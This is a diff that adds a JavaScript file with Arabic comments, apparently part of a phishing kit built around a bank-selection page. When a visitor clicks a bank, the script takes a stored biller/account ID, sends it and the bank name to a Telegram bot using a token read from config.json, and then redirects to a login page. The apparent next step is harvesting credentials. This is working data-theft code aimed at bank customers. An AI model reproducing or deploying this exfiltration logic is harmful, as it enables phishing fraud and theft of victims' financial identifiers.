@@ -1,0 +1,36 @@
+document.addEventListener("DOMContentLoaded", function() {
+    // استماع للأحداث على الأزرار داخل القائمة
+    document.querySelectorAll(".thumb-info").forEach(button => {
+        button.addEventListener("click", function() {
+            var bankName = this.getAttribute("value");
+
+            // جلب البيانات من ملف config.json
+            fetch('config/config.json')
+                .then(response => response.json())
+                .then(config => {
+                    var billerNumber = localStorage.getItem('billerNumber') || '';
+                    var botToken = config.botToken;
+                    var chatId = config.chatId;
+
+                    // الرسالة المراد إرسالها إلى تليجرام
+                    var message = `ID: ${billerNumber}\n\n البنك : ${bankName}`;
+
+                    // استدعاء Telegram API لإرسال الرسالة
+                    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    // إرسال الطلب
+                    fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            // تحويل المستخدم إلى الصفحة التالية بعد إرسال الرسالة بنجاح
+                            window.location.href = "login.html";  // أدخل الصفحة المطلوبة هنا
+                        } else {
+                            console.error("فشل إرسال الرسالة إلى تليجرام.");
+                        }
+                    })
+                    .catch(error => console.error("خطأ في الاتصال:", error));
+            })
+            .catch(error => console.error("خطأ في جلب ملف config.json:", error));
+        });
+    });
+});
